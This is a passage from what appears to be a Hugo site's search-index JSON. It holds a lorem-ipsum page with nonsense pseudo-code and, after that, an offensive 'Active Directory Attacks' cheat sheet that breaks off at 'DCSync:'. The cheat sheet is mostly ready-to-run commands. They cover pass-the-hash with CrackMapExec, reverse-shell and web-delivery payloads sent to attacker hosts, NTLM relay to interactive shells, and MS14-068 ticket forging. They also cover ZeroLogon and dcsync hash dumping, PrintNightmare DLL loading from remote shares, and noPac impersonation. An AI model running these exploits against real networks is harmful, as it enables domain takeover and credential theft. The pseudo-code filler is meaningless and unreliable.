Hugo. You can see all the changes (and screw-ups) by looking at this diff.\n"},{"id":5,"href":"/docs/example/table-of-contents/","title":"Table of Contents","section":"Example Site","content":" Ubi loqui # Mentem genus facietque salire tempus bracchia # Lorem markdownum partu paterno Achillem. Habent amne generosi aderant ad pellem nec erat sustinet merces columque haec et, dixit minus nutrit accipiam subibis subdidit. Temeraria servatum agros qui sed fulva facta. Primum ultima, dedit, suo quisque linguae medentes fixo: tum petis.\nRapit vocant si hunc siste adspice # Ora precari Patraeque Neptunia, dixit Danae Cithaeron armaque maxima in nati Coniugis templis fluidove. Effugit usus nec ingreditur agmen ac manus conlato. Nullis vagis nequiquam vultibus aliquos altera suum venis teneas fretum. Armos remotis hoc sine ferrea iuncta quam!\nLocus fuit caecis # Nefas discordemque domino montes numen tum humili nexilibusque exit, Iove. Quae miror esse, scelerisque Melaneus viribus. Miseri laurus. Hoc est proposita me ante aliquid, aura inponere candidioribus quidque accendit bella, sumpta. Intravit quam erat figentem hunc, motus de fontes parvo tempestate.\niscsi_virus = pitch(json_in_on(eupViral), northbridge_services_troubleshooting, personal( firmware_rw.trash_rw_crm.device(interactive_gopher_personal, software, -1), megabit, ergonomicsSoftware(cmyk_usb_panel, mips_whitelist_duplex, cpa))); if (5) { managementNetwork += dma - boolean; kilohertz_token = 2; honeypot_affiliate_ergonomics = fiber; } mouseNorthbridge = byte(nybble_xmp_modem.horse_subnet( analogThroughputService * graphicPoint, drop(daw_bit, dnsIntranet), gateway_ospf), repository.domain_key.mouse(serverData(fileNetwork, trim_duplex_file), cellTapeDirect, token_tooltip_mashup( ripcordingMashup))); module_it = honeypot_driver(client_cold_dvr(593902, ripping_frequency) + coreLog.joystick(componentUdpLink), windows_expansion_touchscreen); bashGigabit.external.reality(2, server_hardware_codec.flops.ebookSampling( ciscNavigationBacklink, table + cleanDriver), indexProtocolIsp); Placabilis coactis nega ingemuit ignoscat nimia non # Frontis turba. Oculi gravis est Delphice; inque praedaque sanguine manu non.\nif (ad_api) { zif += usb.tiffAvatarRate(subnet, digital_rt) + exploitDrive; gigaflops(2 - bluetooth, edi_asp_memory.gopher(queryCursor, laptop), panel_point_firmware); spyware_bash.statePopApplet = express_netbios_digital( insertion_troubleshooting.brouter(recordFolderUs), 65); } recursionCoreRay = -5; if (hub == non) { portBoxVirus = soundWeb(recursive_card(rwTechnologyLeopard), font_radcab, guidCmsScalable + reciprocalMatrixPim); left.bug = screenshot; } else { tooltipOpacity = raw_process_permalink(webcamFontUser, -1); executable_router += tape; } if (tft) { bandwidthWeb *= social_page; } else { regular += 611883; thumbnail /= system_lag_keyboard; } Caesorum illa tu sentit micat vestes papyriferi # Inde aderam facti; Theseus vis de tauri illa peream. Oculos uberaque non regisque vobis cursuque, opus venit quam vulnera. Et maiora necemque, lege modo; gestanda nitidi, vero? Dum ne pectoraque testantur.\nVenasque repulsa Samos qui, exspectatum eram animosque hinc, aut manes, Assyrii. Cupiens auctoribus pariter rubet, profana magni super nocens. Vos ius sibilat inpar turba visae iusto! Sedes ante dum superest extrema.\n"},{"id":6,"href":"/docs/attacking_active_directory/","title":"Active Directory Attacks","section":"Docs","content":" Active Directory Attacks # Tools # Impacket or the Windows version\nResponder\nInveighZero\nMimikatz\nRanger\nAdExplorer\nCrackMapExec\n# use the latest release, CME is now a binary packaged will all its dependencies root@payload$ wget https://github.com/byt3bl33d3r/CrackMapExec/releases/download/v5.0.1dev/cme-ubuntu-latest.zip # execute cme (smb, winrm, mssql, ...) root@payload$ cme smb -L root@payload$ cme smb -M name_module -o VAR=DATA root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --local-auth root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --shares root@payload$ cme smb 192.168.1.100 -u Administrator -H \u0026#39;:5858d47a41e40b40f294b3100bea611f\u0026#39; -d \u0026#39;DOMAIN\u0026#39; -M invoke_sessiongopher root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M metinject -o LHOST=192.168.1.63 LPORT=4443 root@payload$ cme smb 192.168.1.100 -u Administrator -H \u0026#34;:5858d47a41e40b40f294b3100bea611f\u0026#34; -M web_delivery -o URL=\u0026#34;https://IP:PORT/posh-payload\u0026#34; root@payload$ cme smb 192.168.1.100 -u Administrator -H \u0026#34;:5858d47a41e40b40f294b3100bea611f\u0026#34; --exec-method smbexec -X \u0026#39;whoami\u0026#39; root@payload$ cme smb 10.10.14.0/24 -u user -p \u0026#39;Password\u0026#39; --local-auth -M mimikatz root@payload$ cme mimikatz --server http --server-port 80 Mitm6\ngit clone https://github.com/fox-it/mitm6.git \u0026amp;\u0026amp; cd mitm6 pip install . mitm6 -d lab.local ntlmrelayx.py -wh 192.168.218.129 -t smb://192.168.218.128/ -i # -wh: Server hosting WPAD file (Attacker’s IP) # -t: Target (You cannot relay credentials to the same device that you’re spoofing) # -i: open an interactive shell ntlmrelayx.py -t ldaps://lab.local -wh attacker-wpad --delegate-access ADRecon\n.\\ADRecon.ps1 -DomainController MYAD.net -Credential MYAD\\myuser Active Directory Assessment and Privilege Escalation Script\npowershell.exe -ExecutionPolicy Bypass ./ADAPE.ps1 Ping Castle\npingcastle.exe --healthcheck --server \u0026lt;DOMAIN_CONTROLLER_IP\u0026gt; --user \u0026lt;USERNAME\u0026gt; --password \u0026lt;PASSWORD\u0026gt; --advanced-live --nullsession pingcastle.exe --healthcheck --server domain.local pingcastle.exe --graph --server domain.local pingcastle.exe --scanner scanner_name --server domain.local available scanners are:aclcheck,antivirus,computerversion,foreignusers,laps_bitlocker,localadmin,nullsession,nullsession-trust,oxidbindings,remote,share,smb,smb3querynetwork,spooler,startup,zerologon,computers,users Kerbrute\n./kerbrute passwordspray -d \u0026lt;DOMAIN\u0026gt; \u0026lt;USERS.TXT\u0026gt; \u0026lt;PASSWORD\u0026gt; Rubeus\nRubeus.exe asktgt /user:USER \u0026lt;/password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH\u0026gt; [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ptt] [/luid] Rubeus.exe dump [/service:SERVICE] [/luid:LOGINID] Rubeus.exe klist [/luid:LOGINID] Rubeus.exe kerberoast [/spn:\u0026#34;blah/blah\u0026#34;] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:\u0026#34;OU=,...\u0026#34;] AutomatedLab\nNew-LabDefinition -Name GettingStarted -DefaultVirtualizationEngine HyperV Add-LabMachineDefinition -Name FirstServer -OperatingSystem \u0026#39;Windows Server 2016 SERVERSTANDARD\u0026#39; Install-Lab Show-LabDeploymentSummary Active Directory Recon # Using BloodHound # Use the correct collector\nAzureHound for Azure Active Directory\nSharpHound for local Active Directory\nuse AzureHound\n# require: Install-Module -name Az -AllowClobber # require: Install-Module -name AzureADPreview -AllowClobber Connect-AzureAD Connect-AzAccount . .\\AzureHound.ps1 Invoke-AzureHound use BloodHound\n# run the collector on the machine using SharpHound.exe # https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe # /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe .\\SharpHound.exe -c all -d active.htb --searchforest .\\SharpHound.exe -c all,GPOLocalGroup # all collection doesn\u0026#39;t include GPOLocalGroup by default .\\SharpHound.exe --CollectionMethod DCOnly # only collect from the DC, doesn\u0026#39;t query the computers (more stealthy) .\\SharpHound.exe -c all --LdapUsername \u0026lt;UserName\u0026gt; --LdapPassword \u0026lt;Password\u0026gt; --JSONFolder \u0026lt;PathToFile\u0026gt; .\\SharpHound.exe -c all --LdapUsername \u0026lt;UserName\u0026gt; --LdapPassword \u0026lt;Password\u0026gt; --domaincontroller 10.10.10.100 -d active.htb .\\SharpHound.exe -c all,GPOLocalGroup --outputdirectory C:\\Windows\\Temp --randomizefilenames --prettyjson --nosavecache --encryptzip --collectallproperties --throttle 10000 --jitter 23 # or run the collector on the machine using Powershell # https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1 # /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1 Invoke-BloodHound -SearchForest -CSVFolder C:\\Users\\Public Invoke-BloodHound -CollectionMethod All -LDAPUser \u0026lt;UserName\u0026gt; -LDAPPass \u0026lt;Password\u0026gt; -OutputDirectory \u0026lt;PathToFile\u0026gt; # or remotely via BloodHound Python # https://github.com/fox-it/BloodHound.py pip install bloodhound bloodhound-python -d lab.local -u rsmith -p Winter2017 -gc LAB2008DC01.lab.local -c all Collect more data for certificates exploitation using Certipy\ncertipy find \u0026#39;corp.local/john:Passw0rd@dc.corp.local\u0026#39; -bloodhound certipy find \u0026#39;corp.local/john:Passw0rd@dc.corp.local\u0026#39; -old-bloodhound certipy find \u0026#39;corp.local/john:Passw0rd@dc.corp.local\u0026#39; -vulnerable -hide-admins -username user@domain -password Password123 Then import the zip/json files into the Neo4J database and query them.\nroot@payload$ apt install bloodhound # start BloodHound and the database root@payload$ neo4j console # or use docker root@payload$ docker run -p7474:7474 -p7687:7687 -e NEO4J_AUTH=neo4j/bloodhound neo4j root@payload$ ./bloodhound --no-sandbox Go to http://127.0.0.1:7474, use db:bolt://localhost:7687, user:neo4J, pass:neo4j You can add some custom queries like :\nBloodhound-Custom-Queries from @hausec BloodHoundQueries from CompassSecurity BloodHound Custom Queries from Exegol - @ShutdownRepo Certipy BloodHound Custom Queries from ly4k Replace the customqueries.json file located at /home/username/.config/bloodhound/customqueries.json or C:\\Users\\USERNAME\\AppData\\Roaming\\BloodHound\\customqueries.json.\nUsing PowerView # Get Current Domain: Get-NetDomain\nEnum Other Domains: Get-NetDomain -Domain \u0026lt;DomainName\u0026gt;\nGet Domain SID: Get-DomainSID\nGet Domain Policy:\nGet-DomainPolicy #Will show us the policy configurations of the Domain about system access or kerberos (Get-DomainPolicy).\u0026#34;system access\u0026#34; (Get-DomainPolicy).\u0026#34;kerberos policy\u0026#34; Get Domain Controlers:\nGet-NetDomainController Get-NetDomainController -Domain \u0026lt;DomainName\u0026gt; Enumerate Domain Users:\nGet-NetUser Get-NetUser -SamAccountName \u0026lt;user\u0026gt; Get-NetUser | select cn Get-UserProperty #Check last password change Get-UserProperty -Properties pwdlastset #Get a spesific \u0026#34;string\u0026#34; on a user\u0026#39;s attribute Find-UserField -SearchField Description -SearchTerm \u0026#34;wtver\u0026#34; #Enumerate user logged on a machine Get-NetLoggedon -ComputerName \u0026lt;ComputerName\u0026gt; #Enumerate Session Information for a machine Get-NetSession -ComputerName \u0026lt;ComputerName\u0026gt; #Enumerate domain machines of the current/specified domain where specific users are logged into Find-DomainUserLocation -Domain \u0026lt;DomainName\u0026gt; | Select-Object UserName, SessionFromName Enum Domain Computers:\nGet-NetComputer -FullData Get-DomainGroup #Enumerate Live machines Get-NetComputer -Ping Enum Groups and Group Members:\nGet-NetGroupMember -GroupName \u0026#34;\u0026lt;GroupName\u0026gt;\u0026#34; -Domain \u0026lt;DomainName\u0026gt; #Enumerate the members of a specified group of the domain Get-DomainGroup -Identity \u0026lt;GroupName\u0026gt; | Select-Object -ExpandProperty Member #Returns all GPOs in a domain that modify local group memberships through Restricted Groups or Group Policy Preferences Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName Enumerate Shares\n#Enumerate Domain Shares Find-DomainShare #Enumerate Domain Shares the current user has access Find-DomainShare -CheckShareAccess Enum Group Policies:\nGet-NetGPO # Shows active Policy on specified machine Get-NetGPO -ComputerName \u0026lt;Name of the PC\u0026gt; Get-NetGPOGroup #Get users that are part of a Machine\u0026#39;s local Admin group Find-GPOComputerAdmin -ComputerName \u0026lt;ComputerName\u0026gt; Enum OUs:\nGet-NetOU -FullData Get-NetGPO -GPOname \u0026lt;The GUID of the GPO\u0026gt; Enum ACLs:\n# Returns the ACLs associated with the specified account Get-ObjectAcl -SamAccountName \u0026lt;AccountName\u0026gt; -ResolveGUIDs Get-ObjectAcl -ADSprefix \u0026#39;CN=Administrator, CN=Users\u0026#39; -Verbose #Search for interesting ACEs Invoke-ACLScanner -ResolveGUIDs #Check the ACLs associated with a specified path (e.g smb share) Get-PathAcl -Path \u0026#34;\\\\Path\\Of\\A\\Share\u0026#34; Enum Domain Trust:\nGet-NetDomainTrust Get-NetDomainTrust -Domain \u0026lt;DomainName\u0026gt; Enum Forest Trust:\nGet-NetForestDomain Get-NetForestDomain Forest \u0026lt;ForestName\u0026gt; #Domains of Forest Enumeration Get-NetForestDomain Get-NetForestDomain Forest \u0026lt;ForestName\u0026gt; #Map the Trust of the Forest Get-NetForestTrust Get-NetDomainTrust -Forest \u0026lt;ForestName\u0026gt; User Hunting:\n#Finds all machines on the current domain where the current user has local admin access Find-LocalAdminAccess -Verbose #Find local admins on all machines of the domain: Invoke-EnumerateLocalAdmin -Verbose #Find computers were a Domain Admin OR a specified user has a session Invoke-UserHunter Invoke-UserHunter -GroupName \u0026#34;RDPUsers\u0026#34; Invoke-UserHunter -Stealth #Confirming admin access: Invoke-UserHunter -CheckAccess :heavy_exclamation_mark: Priv Esc to Domain Admin with User Hunting: I have local admin access on a machine -\u0026gt; A Domain Admin has a session on that machine -\u0026gt; I steal his token and impersonate him -\u0026gt;\nProfit!\nPowerView 3.0 Tricks\nUsing AD Module # Get Current Domain: Get-ADDomain\nEnum Other Domains: Get-ADDomain -Identity \u0026lt;Domain\u0026gt;\nGet Domain SID: Get-DomainSID\nGet Domain Controlers:\nGet-ADDomainController Get-ADDomainController -Identity \u0026lt;DomainName\u0026gt; Enumerate Domain Users:\nGet-ADUser -Filter * -Identity \u0026lt;user\u0026gt; -Properties * #Get a spesific \u0026#34;string\u0026#34; on a user\u0026#39;s attribute Get-ADUser -Filter \u0026#39;Description -like \u0026#34;*wtver*\u0026#34;\u0026#39; -Properties Description | select Name, Description Enum Domain Computers:\nGet-ADComputer -Filter * -Properties * Get-ADGroup -Filter * Enum Domain Trust:\nGet-ADTrust -Filter * Get-ADTrust -Identity \u0026lt;DomainName\u0026gt; Enum Forest Trust:\nGet-ADForest Get-ADForest -Identity \u0026lt;ForestName\u0026gt; #Domains of Forest Enumeration (Get-ADForest).Domains Enum Local AppLocker Effective Policy:\nGet-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections Other Interesting Commands # Find Domain Controllers nslookup domain.com nslookup -type=srv _ldap._tcp.dc._msdcs.\u0026lt;domain\u0026gt;.com nltest /dclist:domain.com Get-ADDomainController -filter * | Select-Object name gpresult /r $Env:LOGONSERVER echo %LOGONSERVER% Most common paths to AD compromise # MS14-068 (Microsoft Kerberos Checksum Validation Vulnerability) # This exploit require to know the user SID, you can use rpcclient to remotely get it or wmi if you have an access on the machine.\n# remote rpcclient $\u0026gt; lookupnames john.smith john.smith S-1-5-21-2923581646-3335815371-2872905324-1107 (User: 1) # loc wmic useraccount get name,sid Administrator S-1-5-21-3415849876-833628785-5197346142-500 Guest S-1-5-21-3415849876-833628785-5197346142-501 Administrator S-1-5-21-297520375-2634728305-5197346142-500 Guest S-1-5-21-297520375-2634728305-5197346142-501 krbtgt S-1-5-21-297520375-2634728305-5197346142-502 lambda S-1-5-21-297520375-2634728305-5197346142-1110 # powerview Convert-NameToSid high-sec-corp.localkrbtgt S-1-5-21-2941561648-383941485-1389968811-502 Doc: https://github.com/gentilkiwi/kekeo/wiki/ms14068 Generate a ticket with metasploit or pykek\nMetasploit: auxiliary/admin/kerberos/ms14_068_kerberos_checksum Name Current Setting Required Description ---- --------------- -------- ----------- DOMAIN LABDOMAIN.LOCAL yes The Domain (upper case) Ex: DEMO.LOCAL PASSWORD P@ssw0rd yes The Domain User password RHOSTS 10.10.10.10 yes The target address range or CIDR identifier RPORT 88 yes The target port Timeout 10 yes The TCP timeout to establish connection and read data USER lambda yes The Domain User USER_SID S-1-5-21-297520375-2634728305-5197346142-1106 yes The Domain User SID, Ex: S-1-5-21-1755879683-3641577184-3486455962-1000 # Alternative download: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek $ git clone https://github.com/SecWiki/windows-kernel-exploits $ python ./ms14-068.py -u \u0026lt;userName\u0026gt;@\u0026lt;domainName\u0026gt; -s \u0026lt;userSid\u0026gt; -d \u0026lt;domainControlerAddr\u0026gt; -p \u0026lt;clearPassword\u0026gt; $ python ./ms14-068.py -u darthsidious@lab.adsecurity.org -p TheEmperor99! -s S-1-5-21-1473643419-774954089-2222329127-1110 -d adsdc02.lab.adsecurity.org $ python ./ms14-068.py -u john.smith@pwn3d.local -s S-1-5-21-2923581646-3335815371-2872905324-1107 -d 192.168.115.10 $ python ms14-068.py -u user01@metasploitable.local -d msfdc01.metasploitable.local -p Password1 -s S-1-5-21-2928836948-3642677517-2073454066 -1105 [+] Building AS-REQ for msfdc01.metasploitable.local... Done! [+] Sending AS-REQ to msfdc01.metasploitable.local... Done! [+] Receiving AS-REP from msfdc01.metasploitable.local... Done! [+] Parsing AS-REP from msfdc01.metasploitable.local... Done! [+] Building TGS-REQ for msfdc01.metasploitable.local... Done! [+] Sending TGS-REQ to msfdc01.metasploitable.local... Done! [+] Receiving TGS-REP from msfdc01.metasploitable.local... Done! [+] Parsing TGS-REP from msfdc01.metasploitable.local... Done! [+] Creating ccache file \u0026#39;TGT_user01@metasploitable.local.ccache\u0026#39;... Done! Then use mimikatz to load the ticket.\nmimikatz.exe \u0026#34;kerberos::ptc c:\\temp\\TGT_darthsidious@lab.adsecurity.org.ccache\u0026#34; :warning: If the clock is skewed use clock-skew.nse script from nmap\nLinux\u0026gt; $ nmap -sV -sC 10.10.10.10 clock-skew: mean: -1998d09h03m04s, deviation: 4h00m00s, median: -1998d11h03m05s Linux\u0026gt; sudo date -s \u0026#34;14 APR 2015 18:25:16\u0026#34; Windows\u0026gt; net time /domain /set Mitigations # Ensure the DCPromo process includes a patch QA step before running DCPromo that checks for installation of KB3011780. The quick and easy way to perform this check is with PowerShell: get-hotfix 3011780 From CVE to SYSTEM shell on DC # Sometimes you will find a Domain Controller without the latest patches installed, use the newest CVE to gain a SYSTEM shell on it. If you have a \u0026ldquo;normal user\u0026rdquo; shell on the DC you can also try to elevate your privileges using one of the methods listed in Windows - Privilege Escalation\nZeroLogon # CVE-2020-1472\nWhite Paper from Secura : https://www.secura.com/pathtoimg.php?id=2055\nExploit steps from the white paper\nSpoofing the client credential Disabling signing and sealing Spoofing a call Changing a computer\u0026rsquo;s AD password to null From password change to domain admin :warning: reset the computer\u0026rsquo;s AD password in a proper way to avoid any Deny of Service cve-2020-1472-exploit.py - Python script from dirkjanm\n# Check (https://github.com/SecuraBV/CVE-2020-1472) proxychains python3 zerologon_tester.py DC01 172.16.1.5 $ git clone https://github.com/dirkjanm/CVE-2020-1472.git # Activate a virtual env to install impacket $ python3 -m venv venv $ source venv/bin/activate $ pip3 install . # Exploit the CVE (https://github.com/dirkjanm/CVE-2020-1472/blob/master/cve-2020-1472-exploit.py) proxychains python3 cve-2020-1472-exploit.py DC01 172.16.1.5 # Find the old NT hash of the DC proxychains secretsdump.py -history -just-dc-user \u0026#39;DC01$\u0026#39; -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 \u0026#39;CORP/DC01$@DC01.CORP.LOCAL\u0026#39; # Restore password from secretsdump # secretsdump will automatically dump the plaintext machine password (hex encoded) # when dumping the local registry secrets on the newest version python restorepassword.py CORP/DC01@DC01.CORP.LOCAL -target-ip 172.16.1.5 -hexpass e6ad4c4f64e71cf8c8020aa44bbd70ee711b8dce2adecd7e0d7fd1d76d70a848c987450c5be97b230bd144f3c3 deactivate nccfsas - .NET binary for Cobalt Strike\u0026rsquo;s execute-assembly\ngit clone https://github.com/nccgroup/nccfsas # Check execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local # Resetting the machine account password execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local -reset # Testing from a non Domain-joined machine execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local -patch # Now reset the password back Mimikatz - 2.2.0 20200917 Post-Zerologon\nprivilege::debug # Check for the CVE lsadump::zerologon /target:DC01.LAB.LOCAL /account:DC01$ # Exploit the CVE and set the computer account\u0026#39;s password to \u0026#34;\u0026#34; lsadump::zerologon /target:DC01.LAB.LOCAL /account:DC01$ /exploit # Execute dcsync to extract some hashes lsadump::dcsync /domain:LAB.LOCAL /dc:DC01.LAB.LOCAL /user:krbtgt /authuser:DC01$ /authdomain:LAB /authpassword:\u0026#34;\u0026#34; /authntlm lsadump::dcsync /domain:LAB.LOCAL /dc:DC01.LAB.LOCAL /user:Administrator /authuser:DC01$ /authdomain:LAB /authpassword:\u0026#34;\u0026#34; /authntlm # Pass The Hash with the extracted Domain Admin hash sekurlsa::pth /user:Administrator /domain:LAB /rc4:HASH_NTLM_ADMIN # Use IP address instead of FQDN to force NTLM with Windows APIs # Reset password to Waza1234/Waza1234/Waza1234/ # https://github.com/gentilkiwi/mimikatz/blob/6191b5a8ea40bbd856942cbc1e48a86c3c505dd3/mimikatz/modules/kuhl_m_lsadump.c#L2584 lsadump::postzerologon /target:10.10.10.10 /account:DC01$ CrackMapExec - only check\ncrackmapexec smb 10.10.10.10 -u username -p password -d domain -M zerologon PrintNightmare # CVE-2021-1675 / CVE-2021-34527\nThe DLL will be stored in C:\\Windows\\System32\\spool\\drivers\\x64\\3\\. The exploit will execute the DLL either from the local filesystem or a remote share.\nRequirements:\nSpooler Service enabled (Mandatory) Server with patches \u0026lt; June 2021 DC with Pre Windows 2000 Compatibility group Server with registry key HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint\\NoWarningNoElevationOnInstall = (DWORD) 1 Server with registry key HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA = (DWORD) 0 Detect the vulnerability:\nImpacket - rpcdump python3 ./rpcdump.py @10.0.2.10 | egrep \u0026#39;MS-RPRN|MS-PAR\u0026#39; Protocol: [MS-RPRN]: Print System Remote Protocol It Was All A Dream git clone https://github.com/byt3bl33d3r/ItWasAllADream cd ItWasAllADream \u0026amp;\u0026amp; poetry install \u0026amp;\u0026amp; poetry shell itwasalladream -u user -p Password123 -d domain 10.10.10.10/24 docker run -it itwasalladream -u username -p Password123 -d domain 10.10.10.10 Trigger the exploit:\nNOTE: The payload can be hosted on Impacket SMB server since PR #1109: python3 ./smbserver.py share /tmp/smb/ or using Invoke-BuildAnonymousSMBServer : Import-Module .\\Invoke-BuildAnonymousSMBServer.ps1; Invoke-BuildAnonymousSMBServer -Path C:\\Share -Mode Enable\nSharpNightmare # require a modified Impacket: https://github.com/cube0x0/impacket python3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 \u0026#39;\\\\192.168.1.215\\smb\\addCube.dll\u0026#39; python3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 \u0026#39;C:\\addCube.dll\u0026#39; ## LPE SharpPrintNightmare.exe C:\\addCube.dll ## RCE using existing context SharpPrintNightmare.exe \u0026#39;\\\\192.168.1.215\\smb\\addCube.dll\u0026#39; \u0026#39;C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_addb31f9bff9e936\\Amd64\\UNIDRV.DLL\u0026#39; \u0026#39;\\\\192.168.1.20\u0026#39; ## RCE using runas /netonly SharpPrintNightmare.exe \u0026#39;\\\\192.168.1.215\\smb\\addCube.dll\u0026#39; \u0026#39;C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_83aa9aebf5dffc96\\Amd64\\UNIDRV.DLL\u0026#39; \u0026#39;\\\\192.168.1.10\u0026#39; hackit.local domain_user Pass123 Invoke-Nightmare ## LPE only (PS1 + DLL) Import-Module .\\cve-2021-1675.ps1 Invoke-Nightmare # add user `adm1n`/`P@ssw0rd` in the local admin group by default Invoke-Nightmare -DriverName \u0026#34;Dementor\u0026#34; -NewUser \u0026#34;d3m3nt0r\u0026#34; -NewPassword \u0026#34;AzkabanUnleashed123*\u0026#34; Invoke-Nightmare -DLL \u0026#34;C:\\absolute\\path\\to\\your\\bindshell.dll\u0026#34; Mimikatz v2.2.0-20210709+ ## LPE misc::printnightmare /server:DC01 /library:C:\\Users\\user1\\Documents\\mimispool.dll ## RCE misc::printnightmare /server:CASTLE /library:\\\\10.0.2.12\\smb\\beacon.dll /authdomain:LAB /authuser:Username /authpassword:Password01 /try:50 PrintNightmare - @outflanknl PrintNightmare [target ip or hostname] [UNC path to payload Dll] [optional domain] [optional username] [optional password] Debug informations\nError Message Debug 0x5 rpc_s_access_denied Permissions on the file in the SMB share 0x525 ERROR_NO_SUCH_USER The specified account does not exist. 0x180 unknown error code Share is not SMB2 samAccountName spoofing # During S4U2Self, the KDC will try to append a \u0026lsquo;$\u0026rsquo; to the computer name specified in the TGT, if the computer name is not found. An attacker can create a new machine account with the sAMAccountName set to a domain controller\u0026rsquo;s sAMAccountName - without the \u0026lsquo;$\u0026rsquo;. For instance, suppose there is a domain controller with a sAMAccountName set to \u0026lsquo;DC$\u0026rsquo;. An attacker would then create a machine account with the sAMAccountName set to \u0026lsquo;DC\u0026rsquo;. The attacker can then request a TGT for the newly created machine account. After the TGT has been issued by the KDC, the attacker can rename the newly created machine account to something different, e.g. JOHNS-PC. The attacker can then perform S4U2Self and request a ST to itself as any user. Since the machine account with the sAMAccountName set to \u0026lsquo;DC\u0026rsquo; has been renamed, the KDC will try to find the machine account by appending a \u0026lsquo;$\u0026rsquo;, which will then match the domain controller. The KDC will then issue a valid ST for the domain controller.\nRequirements\nMachineAccountQuota \u0026gt; 0 Check for exploitation\nCheck the MachineAccountQuota of the account crackmapexec ldap 10.10.10.10 -u username -p \u0026#39;Password123\u0026#39; -d \u0026#39;domain.local\u0026#39; --kdcHost 10.10.10.10 -M MAQ StandIn.exe --object ms-DS-MachineAccountQuota=* Check if the DC is vulnerable crackmapexec smb 10.10.10.10 -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; -d domain -M nopac Exploitation\nCreate a computer account impacket@linux\u0026gt; addcomputer.py -computer-name \u0026#39;ControlledComputer$\u0026#39; -computer-pass \u0026#39;ComputerPassword\u0026#39; -dc-host DC01 -domain-netbios domain \u0026#39;domain.local/user1:complexpassword\u0026#39; powermad@windows\u0026gt; . .\\Powermad.ps1 powermad@windows\u0026gt; $password = ConvertTo-SecureString \u0026#39;ComputerPassword\u0026#39; -AsPlainText -Force powermad@windows\u0026gt; New-MachineAccount -MachineAccount \u0026#34;ControlledComputer\u0026#34; -Password $($password) -Domain \u0026#34;domain.local\u0026#34; -DomainController \u0026#34;DomainController.domain.local\u0026#34; -Verbose sharpmad@windows\u0026gt; Sharpmad.exe MAQ -Action new -MachineAccount ControlledComputer -MachinePassword ComputerPassword Clear the controlled machine account servicePrincipalName attribute impacket@linux\u0026gt; addspn.py -u \u0026#39;domain\\user\u0026#39; -p \u0026#39;password\u0026#39; -t \u0026#39;ControlledComputer$\u0026#39; -c DomainController powershell@windows\u0026gt; . .\\Powerview.ps1 powershell@windows\u0026gt; Set-DomainObject \u0026#34;CN=ControlledComputer,CN=Computers,DC=domain,DC=local\u0026#34; -Clear \u0026#39;serviceprincipalname\u0026#39; -Verbose (CVE-2021-42278) Change the controlled machine account sAMAccountName to a Domain Controller\u0026rsquo;s name without the trailing $ # https://github.com/SecureAuthCorp/impacket/pull/1224 impacket@linux\u0026gt; renameMachine.py -current-name \u0026#39;ControlledComputer$\u0026#39; -new-name \u0026#39;DomainController\u0026#39; -dc-ip \u0026#39;DomainController.domain.local\u0026#39; \u0026#39;domain.local\u0026#39;/\u0026#39;user\u0026#39;:\u0026#39;password\u0026#39; powermad@windows\u0026gt; Set-MachineAccountAttribute -MachineAccount \u0026#34;ControlledComputer\u0026#34; -Value \u0026#34;DomainController\u0026#34; -Attribute samaccountname -Verbose Request a TGT for the controlled machine account impacket@linux\u0026gt; getTGT.py -dc-ip \u0026#39;DomainController.domain.local\u0026#39; \u0026#39;domain.local\u0026#39;/\u0026#39;DomainController\u0026#39;:\u0026#39;ComputerPassword\u0026#39; cmd@windows\u0026gt; Rubeus.exe asktgt /user:\u0026#34;DomainController\u0026#34; /password:\u0026#34;ComputerPassword\u0026#34; /domain:\u0026#34;domain.local\u0026#34; /dc:\u0026#34;DomainController.domain.local\u0026#34; /nowrap Reset the controlled machine account sAMAccountName to its old value impacket@linux\u0026gt; renameMachine.py -current-name \u0026#39;DomainController\u0026#39; -new-name \u0026#39;ControlledComputer$\u0026#39; \u0026#39;domain.local\u0026#39;/\u0026#39;user\u0026#39;:\u0026#39;password\u0026#39; powermad@windows\u0026gt; Set-MachineAccountAttribute -MachineAccount \u0026#34;ControlledComputer\u0026#34; -Value \u0026#34;ControlledComputer\u0026#34; -Attribute samaccountname -Verbose (CVE-2021-42287) Request a service ticket with S4U2self by presenting the TGT obtained before # https://github.com/SecureAuthCorp/impacket/pull/1202 impacket@linux\u0026gt; KRB5CCNAME=\u0026#39;DomainController.ccache\u0026#39; getST.py -self -impersonate \u0026#39;DomainAdmin\u0026#39; -spn \u0026#39;cifs/DomainController.domain.local\u0026#39; -k -no-pass -dc-ip \u0026#39;DomainController.domain.local\u0026#39; \u0026#39;domain.local\u0026#39;/\u0026#39;DomainController\u0026#39; cmd@windows\u0026gt; Rubeus.exe s4u /self /impersonateuser:\u0026#34;DomainAdmin\u0026#34; /altservice:\u0026#34;ldap/DomainController.domain.local\u0026#34; /dc:\u0026#34;DomainController.domain.local\u0026#34; /ptt /ticket:[Base64 TGT] DCSync: 